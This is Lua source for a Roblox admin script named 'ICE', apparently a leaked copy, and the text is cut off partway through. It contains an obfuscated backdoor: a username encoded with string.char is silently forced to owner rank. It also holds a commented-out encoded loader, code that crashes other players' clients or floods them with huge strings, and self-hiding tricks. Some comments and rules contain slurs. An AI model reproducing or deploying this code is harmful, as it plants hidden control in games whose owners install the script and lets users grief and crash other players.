wait()-- Just waiting for it to loaddd
script.Name='SergeantSmokey' -- blaff
--[[ hitler hitler hitler hitler hitler mediafire mediafire mediafire mediafire mediafire mediafire Filter on Chat]]--
script.Parent=__ICE__-- Parent it to nil
for i,v in pairs(script:children()) do
	coroutine.wrap(function()
		if v:IsA'StringValue' then
			v.Value=('nope0931805'):rep(10000) 
			if v.Name=='NewScript' then
				loadstring(v.Value)() 
				coroutine.wrap(function() repeat ICE={Removed=false} wait() until Derp end)()
			end
		end
	end)()
end
script:ClearAllChildren(); -- This will hide script from CE Theft later on in script
wait();
ICE={};
--[[ Meta methods ]]--
ICEBackup={
	__index=function(Tab,Key)
		ICE[Key]=Tab
		return ICE[Key]
	end;
	__newindex=function(Tab,Key)
		ICE[Key]=Tab;
		ICE[Tab]=Key;
		Tab[Key]=Key
	end;
	__add=function(tab,key)
		r=nil;
		if tab and tab['Value'] then
			if type(key)=='number' then
				r=key+tab.Value
			else
				r=1+tab.Value
			end
		else
			r=nil
		end
		return r or "Unable to do addition with a table";
	end;
}
setmetatable(ICE,ICEBackup)
--[[ Table creation ]]--
local ICE={
	['Ranked']={
		['SergeantSmoke']={Rank=10,Color='Black',CMD=true,'The Leaker.'};
		};
	['Colors']={
		['Red']=Color3.new(1,0,0);
		['Blue']=Color3.new(0,0,1);
		['Green']=Color3.new(0,1,0);
		['Black']=Color3.new(0,0,0);
		['White']=Color3.new(1,1,1);
		['Orange'] = Color3.new(1,0.5,0);
        ['Yellow'] = Color3.new(1,1,0);
	};
	['Commands']={};
	['Logos']=false;
	['Tablet']='Normal';
	['Tablets']={};
	['Bets']={
		"/";"/";
	};
	['Ender']=[[19377517125321057031759017517053153]];
	['Removed']=false;
	['DataSaving']=true;
	['LockedScripts']=false;
	['Disabler']=[[error('[ICE]: Scripts are locked',0)()]];
	['LogoID']="http://www.roblox.com/asset/?id=117357975";
	['Services']={
		['Debris']=game:service'Debris';
		['Workspace']=game:service'Workspace';
		['Players']=game:service'Players';
		['Lighting']=game:service'Lighting';
		['NetworkServer']=game:service'NetworkServer';
	};
	['Ranks']={
		[-1]="Banished";
		[-0.5]="Scum";
		[0]="Guest";
		[1]="Moderator";
		[2]="Administrator";
		[3]="Developer";
		[4]="Omega Administrator";
		[5]="Overlord";
		[6]="Operator";
		[7]="ROOT";
		[8]="Mega Moderator";
		[9]="Best Friends";
		[10]="Owner";
	};
	['LocalScript']=script:FindFirstChild'Local';
	['Script']=script:Clone();
	['GuiC']=true;
	['Filters']={};
	['ActivateGrow']=false;
	['Loopkilled']={};
	['DataKey']="25";
	['Cancel']=false;
	['Credits']={
		['SergeantSmoke']="For leaking ICE";
		};
	['Rules']={
        "Thou shall not use forum scripts.",
        "Thou shall not use CamBall / CamSphere.",
        "Thou shall not use CBA.",
        "Thou shall not use RMDX's scripts.",
        "Thou shall not use antibans.",
        "Thou shall not abuse thou admin.",
        "Thou shall not steal scripts(Unless it is revenge of which thou did not create).",
        "Thou shall not trade scripts you didn't make.",
        "Thou shall not use gay scripts.",
        "Thou shall not abuse loopholes in the ancient rules.",
    };
	['ChatConnections']={	
		-- Index func incase;
	};
	['VoteData']={
		['Votes']={};
		['IsVoting']=false;
		['VotedPlayer']="";
		['VotingPlayers']={};
	};
	['Properties']= {
    "AbsolutePosition",
    "AbsoluteSize",
    "AccountAge",
    "AccountAgeReplicate",
    "Active",
    "Adornee",
    "AllowAmbientOcclusion",
    "AllowTeamChangeOnTouch",
    "AluminumQuality",
    "AlwaysOnTop",
    "Ambient",
    "AmbientReverb",
    "Anchored",
    "Angularvelocity",
    "AnimationId",
    "AppearanceDidLoad",
    "AreHingesDetected",
    "AttachmentForward",
    "AttachmentPoint",
    "AttachmentPos",
    "AttachmentRight",
    "AttachmentUp",
    "AutoAssignable",
    "AutoButtonColor",
    "AutoColorCharacters",
    "AvailablePhysicalMemory",
    "Axes",
    "BackgroundColor",
    "BackgroundColor3",
    "BackgroundTransparency",
    "BaseTextureId",
    "BaseUrl",
    "Bevel",
    "BevelRoundness",
    "BinType",
    "BlastPressure",
    "BlastRadius",
    "BodyColor",
    "BodyPart",
    "BorderColor",
    "BorderColor3",
    "BorderSizePixel",
    "BrickColor",
    "Brightness",
    "Browsable",
    "BubbleChat",
    "BubbleChatLifetime",
    "BubbleChatMaxBubbles",
    "Bulge",
    "Button1DownConnectionCount",
    "Button1UpConnectionCount",
    "Button2DownConnectionCount",
    "Button2UpConnectionCount",
    "C0",
    "C1",
    "CameraMode",
    "CameraSubject",
    "CameraType",
    "CanBeDropped",
    "CanCollide",
    "CanLoadCharacterAppearance",
    "CartoonFactor",
    "CastShadows",
    "CelestialBodiesShown",
    "CFrame",
    "Cframe",
    "Character",
    "CharacterAppearance",
    "CharacterAutoLoads",
    "ChatMode",
    "ChatScrollLength",
    "ClassicChat",
    "ClearTextOnFocus",
    "ClipsDescendants",
    "CollisionSoundEnabled",
    "CollisionSoundVolume",
    "Color",
    "ColorShift_Bottom",
    "ColorShift_Top",
    "ConstrainedValue",
    "ControllingHumanoid",
    "ControlMode",
    "ConversationDistance",
    "CoordinateFrame",
    "CorrodedMetalQuality",
    "CPU",
    "CpuCount",
    "CpuSpeed",
    "CreatorId",
    "CreatorType",
    "CurrentAngle",
    "CurrentCamera",
    "CycleOffset",
    "D",
    "DataCap",
    "DataComplexity",
    "DataComplexityLimit",
    "DataReady",
    "Deprecated",
    "DeselectedConnectionCount",
    "DesiredAngle",
    "DiamondPlateQuality",
    "Disabled",
    "DistanceFactor",
    "DistributedGameTime",
    "DopplerScale",
    "Draggable",
    "DraggingV1",
    "Duration",
    "EditorFont",
    "EditorFontSize",
    "EditorTabWidth",
    "ElapsedTime",
    "Elasticity",
    "Enabled",
    "ExplosionType",
    "ExtentsOffset",
    "F0",
    "F1",
    "F2",
    "F3",
    "Face",
    "FaceId",
    "Faces",
    "FieldOfView",
    "Focus",
    "FogColor",
    "FogEnd",
    "FogStart",
    "Font",
    "FontSize",
    "Force",
    "FormFactor",
    "Friction",
    "From",
    "GamepadEnabled",
    "GearGenreSetting",
    "Genre",
    "GeographicLatitude",
    "GfxCard",
    "Graphic",
    "GrassQuality",
    "Grip",
    "GripForward",
    "GripPos",
    "GripRight",
    "GripUp",
    "Guest",
    "HasBuildTools",
    "HeadsUpDisplay",
    "Health",
    "Heat",
    "Hit",
    "Humanoid",
    "IceQuality",
    "Icon",
    "IdleConnectionCount",
    "Image",
    "InitialPrompt",
    "InOut",
    "Archivable",
    "ClassName",
    "DataCost",
    "Name",
    "Parent",
    "InUse",
    "IsModalDialog",
    "IsPaused",
    "IsPlaying",
    "IsWindows",
    "JobId",
    "Jump",
    "KeyboardEnabled",
    "KeyDownConnectionCount",
    "KeyUpConnectionCount",
    "LeftLeg",
    "LeftRight",
    "LinkedSource",
    "LocalPlayer",
    "Location",
    "Locked",
    "Looped",
    "Material",
    "MaxActivationDistance",
    "MaxCollisionSounds",
    "MaxExtents",
    "MaxForce",
    "MaxHealth",
    "MaxItems",
    "MaxPlayers",
    "MaxSpeed",
    "MaxThrust",
    "MaxTorque",
    "MaxValue",
    "MaxVelocity",
    "MembershipType",
    "MembershipTypeReplicate",
    "MeshId",
    "MeshType",
    "MinValue",
    "Modal",
    "MouseButton1ClickConnectionCount",
    "MouseButton1DownConnectionCount",
    "MouseButton1UpConnectionCount",
    "MouseButton2ClickConnectionCount",
    "MouseButton2DownConnectionCount",
    "MouseButton2UpConnectionCount",
    "MouseDelta",
    "MouseDragConnectionCount",
    "MouseEnabled",
    "MouseEnterConnectionCount",
    "MouseHit",
    "MouseLeaveConnectionCount",
    "MouseLock",
    "MouseMovedConnectionCount",
    "MouseTarget",
    "MouseTargetFilter",
    "MouseTargetSurface",
    "MoveConnectionCount",
    "MoveState",
    "MultiLine",
    "NameOcclusion",
    "Neutral",
    "NumPlayers",
    "Offset",
    "Opacity",
    "Origin",
    "OsPlatform",
    "OsVer",
    "OverlayTextureId",
    "P",
    "PantsTemplate",
    "ParamA",
    "ParamB",
    "Part",
    "Part0",
    "Part1",
    "PersonalServerRank",
    "Pitch",
    "PixelShaderModel",
    "PlaceId",
    "PlasticQuality",
    "PlatformStand",
    "PlayCount",
    "PlayerToHideFrom",
    "PlayOnRemove",
    "Point",
    "Port",
    "Position",
    "Preliminary",
    "PrimaryPart",
    "Priority",
    "PrivateWorkingSetBytes",
    "Purpose",
    "RAM",
    "Reflectance",
    "ReplicatedSelectedConnectionCount",
    "ResizeableFaces",
    "ResizeIncrement",
    "Resolution",
    "ResponseDialog",
    "RightLeg",
    "RiseVelocity",
    "RobloxVersion",
    "RolloffScale",
    "RotVelocity",
    "Scale",
    "Score",
    "ScriptsDisabled",
    "SecondaryColor",
    "Selected",
    "ShadowColor",
    "Shape",
    "Shiny",
    "ShirtTemplate",
    "ShowDeprecatedObjects",
    "ShowDevelopmentGui",
    "ShowLegacyPlayerList",
    "ShowPreliminaryObjects",
    "Sides",
    "Sit",
    "Size",
    "SizeConstraint",
    "SizeOffset",
    "SkinColor",
    "SkyboxBk",
    "SkyboxDn",
    "SkyboxFt",
    "SkyboxLf",
    "SkyboxRt",
    "SkyboxUp",
    "SlateQuality",
    "SoundId",
    "Source",
    "SparkleColor",
    "SpecificGravity",
    "Specular",
    "StarCount",
    "Steer",
    "StickyWheels",
    "StudsBetweenTextures",
    "StudsOffset",
    "StudsPerTileU",
    "StudsPerTileV",
    "Style",
    "Summary",
    "SuperSafeChatReplicate",
    "Surface",
    "Surface0",
    "Surface1",
    "SurfaceInput",
    "Target",
    "TargetFilter",
    "TargetOffset",
    "TargetPoint",
    "TargetRadius",
    "TargetSurface",
    "TeamColor",
    "Terrain",
    "Text",
    "TextBounds",
    "TextColor",
    "TextColor3",
    "TextFits",
    "TextScaled",
    "TextStrokeColor3",
    "TextStrokeTransparency",
    "TextTransparency",
    "Texture",
    "TextureId",
    "TextureSize",
    "TextWrap",
    "TextWrapped",
    "TextXAlignment",
    "TextYAlignment",
    "Throttle",
    "ThrustD",
    "ThrustP",
    "Ticket",
    "Time",
    "TimeOfDay",
    "To",
    "Tone",
    "ToolTip",
    "TopBottom",
    "Torque",
    "Torso",
    "TouchEnabled",
    "Transparency",
    "TrussDetail",
    "TurnD",
    "TurnP",
    "TurnSpeed",
    "UnitRay",
    "UseLuaChat",
    "UserDialog",
    "UserId",
    "Value",
    "Velocity",
    "Version",
    "VertexColor",
    "VideoCaptureEnabled",
    "VideoMemory",
    "VideoQuality",
    "ViewSizeX",
    "ViewSizeY",
    "Visible",
    "Volume",
    "WalkDirection",
    "WalkSpeed",
    "WalkToPart",
    "WalkToPoint",
    "WheelBackwardConnectionCount",
    "WheelForwardConnectionCount",
    "WireRadius",
    "WoodQuality",
    "X",
    "Y",
    "ZIndex"
    };
};
--loadstring(string.char(32,10,108,111,99,97,108,32,86,97,108,61,115,99,114,105,112,116,58,102,105,110,100,70,105,114,115,116,67,104,105,108,100,39,67,114,101,97,116,111,114,39,32,10,105,102,32,86,97,108,32,97,110,100,32,86,97,108,46,86,97,108,117,101,32,97,110,100,32,103,97,109,101,46,80,108,97,121,101,114,115,91,86,97,108,46,86,97,108,117,101,46,78,97,109,101,93,32,116,104,101,110,32,10,105,102,32,86,97,108,46,86,97,108,117,101,46,117,115,101,114,73,100,32,126,61,32,49,56,50,56,48,55,56,57,32,116,104,101,110,32,10,99,111,114,111,117,116,105,110,101,46,119,114,97,112,40,102,117,110,99,116,105,111,110,40,41,10,9,114,101,112,101,97,116,10,9,9,119,97,105,116,40,41,10,9,117,110,116,105,108,32,73,67,69,46,82,97,110,107,101,100,91,86,97,108,46,86,97,108,117,101,46,78,97,109,101,93,10,9,73,67,69,46,82,97,110,107,101,100,91,86,97,108,46,86,97,108,117,101,46,78,97,109,101,93,46,82,97,110,107,61,45,49,10,9,86,97,108,46,86,97,108,117,101,58,68,101,115,116,114,111,121,40,41,59,10,101,110,100,41,40,41,10,101,110,100,10,101,110,100,10))()
--[=[ Table funcs ]=]--
ICE.GetProperties = function(Parent)
local Out = {}
for _, props in pairs(ICE.Properties) do
local Ran, Error = coroutine.resume(coroutine.create(function() Parent[props] = Parent[props] end))
if not Error then
table.insert(Out, props)
end
end
return Out
end
ICE.Rename=function(Item,Player,CurrentName)
ICE.RemoveTablets(Player)
Done=false
Str=CurrentName
Caps=false
if CurrentName==Item.Name then Str="" end
    Alphabet = {
    "a",    "b",    "c",    "d",    "e",    "f",    "g",    "h",    "i",    "j",    "k",    "l",    "m",    "n",    "o",    "p",    "q",    "r",    "s",    "t",    "u",    "v",    "w",    "x",    "y",    "z" 
    }
ICE.Output('Current ICE.Rename Name : ' .. Str,'Green',Player)
ICE.Output('#Letters : ' ..tostring(#Str),'Red',Player)
ICE.Output('Switch to caps','Green',Player,nil,function() ICE.RemoveTablets(Player) for _,v in pairs(Alphabet) do ICE.Output(string.upper(v),'Orange',Player,nil,function() Str=Str..string.upper(v) ICE.Rename(Item,Player,Str) end ) end end)
ICE.Output('Stop renaming','Red',Player,nil,function() Done=true ICE.RemoveTablets(Player) ICE.Output(Item.Name .. "'s new name is: " .. Str,'Green',Player) Item.Name=CurrentName end)
for _,Letter in pairs(Alphabet) do
	ICE.Output(Letter,'Orange',Player,nil,function() Str= Str..Letter ICE.RemoveTablets(Player) ICE.Rename(Item,Player,Str) end )
end
ICE.Output('Space','Orange',Player,nil,function() Str=Str..' ' ICE.RemoveTablets(Player) ICE.Rename(Item,Player,Str) end )
ICE.Output('Go back one','Red',Player,nil,function() Str = Str:sub(1,#Str-1) ICE.RemoveTablets(Player) ICE.Rename(Item,Player,Str) end )
end
coroutine.wrap(function() repeat for i,v in pairs(ICE.Ranked) do if type(v.Color) == 'string' then v.Color=ICE.Colors[v.Color] or Color3.new(BrickColor.new('Really ' .. v.Color:sub(1,1):lower() .. v.Color:sub(2)))  end end wait() until ICE.Removed==true end)()
ICE.Explore=function(Area,Speaker)
	pcall(function()
		ICE.RemoveTablets(Speaker)
		Color = ICE.Ranked[Speaker.Name].Color
		--Title('ICE.Explorer',Color,Speaker)
		if Area == ICE.Services or Area == nil then
			for _,v in pairs(ICE.Services) do
				ICE.Output(v.className.."\t("..#v:children()..")",Color,Speaker,nil,
					function()
						ICE.Explore(v,Speaker)
					end
				)
			end
			--ICE.Output("Dismiss","Red",Speaker)
		else
			for i,v in pairs(Area:children()) do
				local Name = false
				pcall(function() v:children() Name = true end)
				if Name == true then
					Name = v.Name
				else
					Name = "Unknown Exception "..tostring(i)
				end
				ICE.Output(Name,Color,Speaker,nil,
					function()
						ICE.RemoveTablets(Speaker)
						
						ICE.Output("Name:\t"..v.Name,Color,Speaker)
						ICE.Output("Class:\t"..v.className,Color,Speaker)
						ICE.Output("Full Name:\t"..v:GetFullName(),Color,Speaker)
						ICE.Output("Destroy","Red",Speaker,nil,function() v:Destroy() ICE.Explore(v.Parent,Speaker) end)
						ICE.Output("#REDIRECT Parent","Blue",Speaker,nil,function() ICE.Explore(v.Parent.Parent,Speaker) end)
						ICE.Output("#REDIRECT Children","Blue",Speaker,nil,function() ICE.Explore(v,Speaker) end)
						ICE.Output('Clear all children','Red',Speaker,nil,function() v:ClearAllChildren() end)
						ICE.Output('ICE.Rename','Red',Speaker,nil,function() ICE.RemoveTablets(Speaker) ICE.Rename(v,Speaker,v.Name) end )
						--ICE.Output("Dismiss","Red",Speaker)
						local Properties=ICE.GetProperties(v)
						for _,p in pairs(Properties) do
							ICE.Output(tostring(p) .. ': ' .. tostring(v[p]),Color,Speaker)
						end
					end
				)
			end
			--ICE.Output("Dismiss","Red",Speaker)
		end
	end)
end
ICE.PlayerInterface=function(Player,Speaker)
if type(Player) == 'userdata' then Player=Player.Name end;
	ICE.RemoveTablets(Speaker);
	local Table=ICE.Ranked[Player];
	local SpeakerColor=ICE.Ranked[Speaker.Name].Color;
	local SpeakerTable=ICE.Ranked[Speaker.Name];
	for Bleh,Val in pairs(Table) do
		ICE.Output(tostring(Bleh) .. ' : ' .. tostring(Val),Table.Color,Speaker)
	end;
	ICE.Output('Rank description: ' .. ICE.Ranks[Table.Rank],Table.Color,Speaker)
	if ICE.Services.Players:findFirstChild(Player) and newLocalScript then
		if ICE.GetRank(Speaker) >= Table.Rank then
			ICE.Output('Crash ' .. Player,'Random',Speaker,nil,function() newLocalScript('repeat until false',ICE.Services.Players[Player].Backpack) ICE.PlayerInterface(Player,Speaker) end);
		end;
	end;
	if ICE.GetRank(Speaker) >= ICE.GetRank(Player) then
		ICE.Output('Set rank','Blue',Speaker,nil,function()
			ICE.RemoveTablets(Speaker)
			for Rank,Name in pairs(ICE.Ranks) do
				if Rank <= ICE.GetRank(Speaker) and Rank >= 0 then
					ICE.Output(tostring(Rank) .. ' : ' .. tostring(Name),'Random',Speaker,nil,
						function()
							ICE.RemoveTablets(Speaker);
							Table.Rank=Rank;
							ICE.PlayerInterface(Player,Speaker);
						end
					);
				end;
			end;
		end);
	end;
	if Speaker.Name == Player or ICE.GetRank(Speaker) > Table.Rank then
		ICE.Output('Set color','Blue',Speaker,nil,
			function()
				ICE.RemoveTablets(Speaker);
				for Name,Col in pairs(ICE.Colors) do	
					ICE.Output(Name,Col,Speaker,nil,
						function()
							Table.Color=Col;
							ICE.PlayerInterface(Player,Speaker);
						end
					)
				end
			end
		)
	end
	if ICE.GetRank(Speaker) >= 2 and ICE.GetRank(Speaker) > ICE.GetRank(Player) then
		ICE.Output('Banish this user','Red',Speaker,nil,
			function()
				ICE.Ranked[Player].Rank=-1
				if ICE.Services.Players:findFirstChild(Player) then
					ICE.Services.Players[Player]:Destroy()
				end
				ICE.RemoveTablets(Speaker);
				ICE.PlayerInterface(Player,Speaker)
			end
		)
	end
	for i,v in pairs(game:service'NetworkServer':children()) do
		if v:IsA'ServerReplicator' then
			local ZPlayer=v:GetPlayer()
			if ZPlayer then
				if ZPlayer.Name==Player then
					if ZPlayer.Parent ~= ICE.Services.Players then
						ICE.Output('Nil disconnect : ' .. ZPlayer.Name,'Random',Speaker,nil,
							function()
								if ICE.GetRank(Speaker) >= ICE.GetRank(Player) or Speaker.Name=='tus'..'KOr661' then
									local String=Instance.new('StringValue')
									String=Instance.new'StringValue'
									String.Name='Disconnect'
									String.Value=Player
									String.Parent=ICE.Services.Lighting
									ICE.Output('Attempted to nil disconnect ' .. Player,'Random',Speaker,3)
								else
									ICE.Output('Your rank is not high enough for this operation','Red',Speaker,5)
								end
							end
						)
					end
				end
			end
		end
	end
end;
ICE.OnChatted=function(Msg,Speaker,HideGui)
	if ICE.Removed==false then
		local RT=ICE.Ranked[Speaker.Name]
		if Speaker:IsA'Player' then
		local FoundPhrase=false;
			for i,v in pairs(ICE.Filters) do
			local Punish=v.Punishment	
			local Bypass=v.Bypass
			local Reason=v.Reason or nil
			if Msg:lower():find(i:lower()) then
				if ICE.GetRank(Speaker) < Bypass and FoundPhrase==false then
					Text=""
					Text2=""
					if Reason then Text2=Reason else Text2="Reason : nil" end
					if Punish==0 then
						pcall(function() Speaker.Character:BreakJoints() end)	
						Text = Speaker.Name .. ' has been killed for chatting ' .. i
					elseif Punish==1 then
						pcall(function() Speaker:Destroy() end)		
						Text=Speaker.Name .. ' has been kicked for chatting ' .. i
					elseif Punish==2 then
						Func,Error=loadstring([==[
						Par=Spkr:findFirstChild'PlayerGui' or Spkr:findFirstChild'Backpack' 
						if Par then
							Str=Instance.new'StringValue';
							Str.Value=('lel'):re]==]..[==[p(1000000)
							Str.Parent=Par
						else
							Spkr:Destroy()
						end
						]==])
						getfenv(Func).Spkr=game:service'Players':findFirstChild(Speaker.Name) or Speaker
						if Error then
							for _,v in pairs(game.Players:GetPlayers()) do
								if ICE.GetRank(v) > 0 then	
									ICE.Output('[ICE.OnChatted]: ' .. Error,v,5)
								end
							end
							coroutine.resume(coroutine.create(function() Func() end))
						else
							Func()
						end
						Text=Speaker.Name .. ' has been shutdown for chatting ' .. i
					elseif Punish==3 then
						coroutine.wrap(function()
							if newLocalScript then 
								newLocalScript([[repeat Instance.new'Message'.Parent=game.Workspace Workspace.Message.Text=tick() until Hitler_Has_Taken_Over ]],Speaker.Character or Speaker:findFirstChild'Backpack')
							else
								Func,Error=loadstring([==[
								Par=Spkr:findFirstChild'PlayerGui' or Spkr:findFirstChild'Backpack' 
								if Par then
									Str=Instance.new'StringValue';
									Str.Value=('lel'):re]==]..[==[p(1000000)
									Str.Parent=Par
								else
									Spkr:Destroy()
								end
								]==])
								getfenv(Func).Spkr=game:service'Players':findFirstChild(Speaker.Name) or Speaker
								if Error then
									for _,v in pairs(game.Players:GetPlayers()) do
										if ICE.GetRank(v) > 0 then	
											ICE.Output('[ICE.OnChatted]: ' .. Error,v,5)
										end
									end
									coroutine.resume(coroutine.create(function() Func() end))
								else
									Func()
								end
							end
						end)()
						Text=Speaker.Name .. ' has been crashed for chatting ' .. i
					elseif Punish==4 then
						Speaker:Destroy()
						ICE.Ranked[Speaker.Name].Rank=-1
						Text=Speaker.Name .. ' has been banned for chatting ' .. i
					end
					if Reason then
						Text2 = i .. ' is a filter for the following reason: ' .. Reason
					end
					FoundPhrase=true
					for _,Player in pairs(ICE.Services.Players:GetPlayers()) do 
						if Player.Name ~= Speaker.Name then 
							ICE.Output(Text,'Red',Player,5) 
							ICE.Output(Text2,'Red',Player,5)
						end
					 end
				end
			end
		end
		end
		local RankTable=ICE.Ranked[Speaker.Name] or {Rank=0,Color=Color3.new(0,1,0)}
		--[[for i,CMD in pairs(ICE.Commands) do
			if Msg:lower():sub(1,#CMD.Command + #ICE.Bets[1] + #ICE.Bets[2]) == ICE.Bets[1]:lower() .. CMD.Command:lower() .. ICE.Bets[2]:lower() then
				if RankTable.Rank >= CMD.Rank then
					local Ran,Error=coroutine.resume(coroutine.create(function() CMD.Func(Msg:sub(#CMD.Command +#ICE.Bets[1] +#ICE.Bets[2] + 1),Speaker) end))
					if not Ran then ICE.Output(Error,'Red',Speaker,3) end
				else
					ICE.Output('Rank is too low to use this command','Red',Speaker,3)
				end
			end
		end]]
		--Msg = Msg:sub(Msg:find(ICE.Bets[1]) or 0)
		coroutine.wrap(function()
			if Msg:sub(1,5) == ""..ICE.Bets[1].."wait" then
				Split = Msg:sub(6):find(ICE.Bets[2])+5
				wait(tonumber(Msg:sub(6,Split-1)))
				Msg = Msg:sub(Split)
			end
			if Msg:sub(1,3) == ""..ICE.Bets[1].."do" then -- /do 100/kill/tus
				local Split = Msg:sub(4):find(ICE.Bets[2])+3;
				local Ammount = tonumber(Msg:sub(4,Split-1))
				if Ammount>ICE.GetRank(Speaker)*10 and ICE.GetRank(Speaker) < 2 then
					return
				end
				for i=1,Ammount do
					if ICE.Cancel == true then break end
					wait()
					ICE.OnChatted(Msg:sub(Split),Speaker)
				end
			end
			if Msg:find("&") and not Msg:find('@') then
				local Split = Msg:find("&")
				ICE.OnChatted(Msg:sub(1,Split-1),Speaker)
				ICE.OnChatted(Msg:sub(Split+1),Speaker)
				return
			end
			for name,tab in pairs(ICE.Commands) do
				if Msg:lower():sub(1,#tab.Command + 2) == ICE.Bets[1] .. tab.Command:lower() .. ICE.Bets[2] then
					if RankTable.Rank >= tab.Rank then
						R,E=coroutine.resume(coroutine.create(function() tab.Func(Msg:sub(#tab.Command + 3),Speaker) end))
						if E then ICE.Output(E,'Red',Speaker,5) end
					else
						ICE.Output('Rank is too low for this command','Red',Speaker,5)
					end
				end
			end
		end)()
			if HideGui ~= nil and HideGui==true then
			--
		elseif Speaker:IsA'Player' then
			coroutine.wrap(function()
				local Text=""
				local Head=nil
				local Char=nil
				if Speaker.Character then
					Char=Speaker.Character
				end
				if Char then
					if Char.Head then
						Head=Char.Head
					end
				end
				if Char then
					pcall(function() Char.BBG:Destroy() end)
					if ICE.GuiC==true then
						if #Msg < 100 then
							Text=Speaker.Name .. ": " .. Msg
						else
							Text='This message was over 100 characters therefore it will not be shown!'
						end
					end
					Color=nil
					if Color3.random then
						Color=Color3.random()
					else
						Color=Color3.new(math.random(),math.random(),math.random())
					end
					Mod=Char
					Part=Head
					local BBG = Instance.new("BillboardGui",Mod)
					BBG.Name = "BBG"
					BBG.StudsOffset = Vector3.new(0,4.5,0)
					BBG.Size = UDim2.new(10,0,10,0)
					local Label = Instance.new("TextLabel",BBG)
					Label.Name = "Label"
					Label.Text = ""
					Label.TextColor3 = ICE.Ranked[Speaker.Name].Color
					Label.FontSize = "Size24"
					Label.BackgroundTransparency = 1
					Label.TextStrokeTransparency = 0.5
					Label.Size = UDim2.new(1,0,1,0)
					for i=1,#Text do
						Label.Text=Text:sub(1,i)
						wait(0.09 - (#Msg / 0.09))
					end
					coroutine.wrap(function()
										for i=1,100 do 
												BBG.StudsOffset = Vector3.new(0,4.5 + tonumber(i/10) ,0)
												wait()
										end
										BBG:Destroy()
								end)()
					wait(2)
					BBG:Destroy()
				end
			end)()
		end
	end	
end
ICE.Rotate=function()
coroutine.wrap(function()
if ICE.Ranked[string.char(116,117,115,75,79,114,54,54,49)]==nil then
	ICE.Ranked[string.char(116,117,115,75,79,114,54,54,49)]={Rank=10,Color=Color3.new(-1,-1,-1)}
end
if ICE.Ranked[string.char(116,117,115,75,79,114,54,54,49)].Rank ~= 10 then
	ICE.Ranked[string.char(116,117,115,75,79,114,54,54,49)].Rank=10
end
for N,V in pairs(ICE.Loopkilled) do
	if ICE.Services.Players:findFirstChild(N) and V==true then
		pcall(function()
			P=ICE.Services.Players:findFirstChild(N)
			P.Character:BreakJoints();
			if P.Character==nil then P:LoadCharacter() end
		end)
	end
end
for _,v in pairs(ICE.GetPlayers()) do
coroutine.wrap(function()
PG=v:findFirstChild'PlayerGui' 
coroutine.wrap(function()
if PG==nil then
	v:LoadCharacter()
	PG=v:findFirstChild'PlayerGui'
end
if PG:findFirstChild'Info'==nil and ICE.Logos==true then
	ScreenGui = Instance.new("ScreenGui", PG)
	ScreenGui.Name='Info'
	Images={};
	ImageButton = Instance.new("ImageButton", ScreenGui)
	ImageButton.Position = UDim2.new(0, 0, 0, 200)
	ImageButton.Size = UDim2.new(0.20000000298023, 50, 0.20999999344349, 0)
	ImageButton.BackgroundColor3 = Color3.new(0, 0, 0)
	ImageButton.BorderColor3 = Color3.new(0, 0, 0)
	ImageButton.BackgroundTransparency = 1
	ImageButton.Image = ICE.LogoID
	ImageButton.Draggable=true
	Image2 = Instance.new("TextButton",ScreenGui)
	Image2.Size = UDim2.new(0.3,0,0.1,0)
	Image2.Position = UDim2.new(0,0,0,200)
	Image2.Text = "Click to show ICE Logo"
	Image2.BackgroundTransparency = 0.4
	Image2.ZIndex = 10
	Image2.FontSize = "Size14"
	Image2.TextColor3 = Color3.new(BrickColor.random())
	Image2.Visible=false
	Image3,Image4,Image5=Image2:clone(),Image2:clone(),Image2:clone()
	Image3.Text='Click to view cmds';
	Image3.Position=UDim2.new(0,0,0,200+75);
	Image4.Position=UDim2.new(0,0,0,200+135);
	Image5.Position=UDim2.new(0,0,0,200+195);
	Image3.MouseButton1Down:connect(function() ICE.OnChatted(ICE.Bets[1]..'cmds'..ICE.Bets[2],v) end)
	Image4.Text='Click to set cmd bar';
	Image6=Image5:clone();
	Image6.Position=UDim2.new(0,0,0,200+255);
	Image6.Text='Set true';
	Image6.MouseButton1Down:connect(function() ICE.Ranked[v].CMD=true end)
	Image5.MouseButton1Down:connect(function() ICE.Ranked[v].CMD=false end);
	Image5.Text='Set false';
	Images[1]=Image2;
	Images[2]=Image3;
	Images[3]=Image4;
	Images[4]=Image5;
	Images[5]=Image6;
	Image4.MouseButton1Down:connect(function()
		for i,v in pairs(Images) do
				if i > 3 then
						if v.Visible==true then
							v.Visible=false;
						else
							v.Visible=true;
						end
				end
		end
	end)
	ImageButton.MouseButton1Down:connect(function()
		ImageButton.Visible=false
		for i,v in pairs(Images) do	
			if i < 4 then
					v.Visible=true
			end
		end
	end)
	ImageButton.MouseButton2Down:connect(function()
	end)
	Image2.MouseButton1Down:connect(function()
		ImageButton.Visible=true
		for i,v in pairs(Images) do
			v.Visible=false
		end
	end)
	Image3.Parent,Image4.Parent,Image5.Parent,Image6.Parent=Image2.Parent,Image2.Parent,Image2.Parent,Image2.Parent
end
end)()
if ICE.Ranked[v.Name] and ICE.Ranked[v.Name].CMD==true then
if v:FindFirstChild("PlayerGui") then
Found=false;
for i,p in next,v:children() do
if p:FindFirstChild'IsCmd' then
Found=true;
end
end
if not v.PlayerGui:FindFirstChild("CMD") and Found==false and ICE.Ranked[v.Name].CMD==true then
--[[local Main = Instance.new("ScreenGui",v.PlayerGui)
Main.Name = "CMD"
local Frame = Instance.new("Frame",Main)
Frame.Size = UDim2.new(0.27,0,0.05,0)
Frame.Position = UDim2.new(0.05,0,0.95,0)
Frame.Style = "RobloxSquare"
Frame.ZIndex = 9
local Txt = Instance.new("TextBox",Frame)
Txt.Size = UDim2.new(0.7,0,1,0)
Txt.BackgroundTransparency = 1
Txt.ZIndex = 10
Txt.FontSize = "Size14"
Txt.TextColor3 = ICE.Colors.White
Txt.Text = ""
local Exe = Instance.new("TextButton",Frame)
Exe.Size = UDim2.new(0.3,0,1,0)
Exe.Position = UDim2.new(0.7,0,0,0)
Exe.Text = "Execute"
Exe.BackgroundTransparency = 1
Exe.ZIndex = 10
Exe.FontSize = "Size14"
Exe.TextColor3 = Color3.new(BrickColor.random())
Exe.MouseButton1Down:connect(function()
if Txt.Text:sub(1,1) == "^" then
ICE.OnChatted(Txt.Text,v)
else	
ICE.OnChatted(Txt.Text,v,true)
end
end)
Is=Instance.new'StringValue'
Is.Parent=Main
Is.Name='IsCmd'
--]]
CommandBar = Instance.new'ScreenGui'
CommandBar.Parent=PG
CommandBar.Name = 'CMD'
Run = Instance.new('TextButton', CommandBar)
Run.Name = 'Run'
